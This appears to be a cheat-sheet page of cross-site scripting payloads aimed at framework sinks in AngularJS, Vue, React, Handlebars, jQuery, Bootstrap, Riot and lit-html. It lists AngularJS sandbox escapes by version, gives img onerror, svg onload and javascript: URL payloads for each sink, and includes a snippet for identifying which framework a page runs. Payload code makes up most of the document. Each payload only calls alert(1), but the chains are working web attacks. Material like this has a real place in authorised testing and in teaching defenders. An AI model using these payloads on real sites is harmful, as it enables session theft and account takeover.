# Framework sinks — template-eval and framework-controlled XSS

Modern frameworks bind data to the DOM — the framework itself is
the sink. Each has a canonical payload family and a version-locked
escape history.

---

## 1. Angular (AngularJS 1.x) — the expression sandbox

Angular 1.x `{{expr}}` evaluates Angular expressions — not raw JS,
but sandbox escapes exist per version:

```html
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>
<div ng-app>{{$eval.constructor('alert(1)')()}}</div>
<div ng-app>{{$on.constructor('alert(1)')()}}</div>
```

The `constructor.constructor` chain reaches `Function()` — the
canonical escape across versions where it isn't blacklisted.

Version-specific escapes (the sandbox blacklist changes):

```javascript
// 1.0-1.1.5:  {{constructor.constructor('alert(1)')()}}
// 1.2.0-1.2.18: {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(
//   b[a].getPrototypeOf(a.sub),a.sub).value,0,'alert(1)')()}}
// 1.2.19-1.2.23: {{toString.constructor.prototype.toString.call.call(
//   [],0,'alert(1)')()}}
// 1.2.24-1.2.29: {{'a'.constructor.prototype.charAt=[].join;
//   $eval('x=1};alert(1);//')}}
// 1.3.x: {{"a".constructor.prototype.charAt=[].join;$eval(
//   'x=1};alert(1);//')}}
// 1.4.x-1.5.x: {{"a".sub.call.call("a".sub,"a".sub).value(1,"alert(1)")}}
// 1.6.x+: sandbox removed — plain expressions: {{alert(1)}} doesn't
//         run (no implicit eval) — use: {{$eval('alert(1)')}}
```

Detection — `ng-app`, `ng-controller`, `{{}}` in the markup, or
`angular` in the JS bundle. The version: `angular.version.full`.

ng-csp mode: `<div ng-app ng-csp>` still evaluates expressions —
CSP doesn't gate Angular's own eval.

`ng-bind-html` / `$sce.trustAsHtml` — the directive renders HTML:
`<div ng-bind-html="userInput">` with userInput containing
`<img onerror>` — the $sce "sanitize" is version-dependent.

---

## 2. Vue (2.x/3.x) — template and directive sinks

```html
<!-- Vue template interpolation is NOT raw JS — but reaches scope: -->
<div id=app>{{constructor.constructor('alert(1)')()}}</div>
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<div id=app>{{$root.constructor.constructor('alert(1)')()}}</div>
```

Directives — v-html is the dangerous one:

```html
<div v-html="userInput"></div>        -- renders HTML — full tag space
<div v-bind:title="userInput">         -- attribute binding
<div :inner-h-t-m-l.prop="userInput">  -- prop-binding HTML
<div :onclick.prop="userInput">        -- handler prop — JS!
<a :href.prop="userInput">             -- URL binding — javascript:
```

`v-on:click="expr"` — the expression runs on click:
```html
<div v-on:click="alert(1)">x</div>
```

Vue 2's `{{}}` compiles to a render function — the `constructor.
constructor` escape reaches Function() unless the expression parser
blocks it (Vue2 parses via `new Function` internally).

---

## 3. React — dangerouslySetInnerHTML + href sinks

```jsx
<div dangerouslySetInnerHTML={{__html: userInput}} />
   -- the only raw-HTML path — full tag space when reachable
<a href={userInput}>x</a>
   -- React doesn't scheme-check href → javascript:alert(1)
<iframe src={userInput}>
   -- javascript: works in iframe src
```

React escapes all `{{}}`-style rendering by default — the two real
sinks are `dangerouslySetInnerHTML` and URL-bearing props. JSX
expressions `{{x}}` render TEXT only.

React's javascript:-URL warning is dev-mode only — production
renders it.

---

## 4. Handlebars — `{{{triple}}}` and helper injection

```handlebars
{{x}}        -- escaped (HTML entities)
{{{x}}}      -- RAW — markup context, full tag space
{{&x}}       -- raw too
{{this}}     -- context-dependent
{{helper x}} -- custom helpers can eval
```

```html
<!-- {{{x}}} → -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Helper-injection (server-side mostly): `{{helper "payload"}}` where
the helper evals — the client-side version is rare.

---

## 5. jQuery — the eval-everything library

jQuery's DOM-manipulation methods EVAL script tags they insert:

```javascript
$('#x').html(userInput)        // <script> in userInput RUNS
$('#x').append(userInput)      // same
$('#x').prepend(userInput)
$('#x').before(userInput)
$('#x').after(userInput)
$(userInput)                   // $(html) creates+evals
$.parseHTML(userInput)          // explicit — evals scripts
$.globalEval(userInput)         // direct eval
$('#x').load(url)               // loads remote HTML+scripts
$.getScript(url)                // remote script
$.get(url).done(...)            // responseType-dependent
```

```html
<!-- for .html()/.append() sinks -->
<script>alert(1)</script>        -- WORKS (jQuery evals it)
<img src=x onerror=alert(1)>     -- also works
<svg onload=alert(1)>
```

The `$(input)` ambiguity: `$('#x')` selects, `$('<img...>')` creates —
old jQuery (<1.6?) treated arbitrary strings as HTML. Modern jQuery
still evals scripts in `.html()`.

`$.fn` plugins add their own sinks — `.tooltip({html:true})`,
`.popover({html:true})` (Bootstrap tooltips with html:true eval).

---

## 6. Bootstrap — tooltip/popover html:true

```javascript
$('[data-toggle=tooltip]').tooltip({html:true})
   → title attribute becomes HTML:
   <button title="<img src=x onerror=alert(1)>">
```

`html:true` opts INTO unsafe rendering — look for it in the init
code, then the title/content attr is the injection point.

---

## 7. Polymer/Riot/Mithril — template-eval surfaces

```html
<!-- Polymer: -->
<dom-module><template>{{userInput}}</template></dom-module>
   -- {{}} is one-way binding — text only, but [[]] + innerHTML
     paths exist

<!-- Riot: -->
<riot-tag>{expr}</riot-tag>
   -- {expr} is JS-eval'd in the tag's scope:
   {alert(1)}
   {this.constructor.constructor('alert(1)')()}
```

Mithril `m.trust(html)` — explicit unsafe-render, same as
dangerouslySetInnerHTML.

---

## 8. Template literals and tagged templates — the JS-side

```javascript
el.innerHTML = `<div>${userInput}</div>`;
   -- ${} in a template literal is STRING context — the browser
      parses the result as HTML — full tag space:
      userInput = <img src=x onerror=alert(1)>

dompurify.sanitize`<div>${userInput}</div>`;
   -- tagged-template sanitizer — context-aware, only bypass via
      the sanitizer's own bugs
```

The `${}` inside a template literal that lands in innerHTML is
functionally the HTML-context case — the literal is just the
transport.

---

## 9. lit-html / htm — the tagged-template frameworks

```javascript
import {html} from 'lit-html';
html`<div>${userInput}</div>`
   -- lit-html binds ${} as DATA — text-escaped by default
html`<div>${unsafeHTML(userInput)}</div>`
   -- unsafeHTML directive — raw HTML
html`<a href=${userInput}>x</a>`
   -- attribute binding — javascript: works if scheme unchecked
```

lit-html is safe-by-default; the unsafe directives are the sinks.

---

## 10. The framework-detection quick-map

```javascript
window.angular?.version.full          // AngularJS 1.x
window.Vue?.version                   // Vue
document.querySelector('[data-reactroot],#__next,[data-reactid]')
                                      // React
window.Ember                          // Ember
window.jQuery?.fn.jquery              // jQuery version
window.Handlebars                     // Handlebars
window.m                              // Mithril
document.querySelector('dom-module')  // Polymer
```

The version names the escape — for Angular, `gadgets.md` §2 has
the per-version table; for DOMPurify, the sanitizer version.

---

## 11. Server-side templates that leak to client

```javascript
// EJS/Pug/Handlebars rendered server-side with user input →
// the output lands in whichever HTML context — the framework
// is irrelevant once rendered; check the RAW response context
```

The distinction: client-side framework sinks need the framework's
own payload (Angular expressions, Vue directives); server-rendered
templates reduce to the five base contexts (html/attr/js/url/dom).
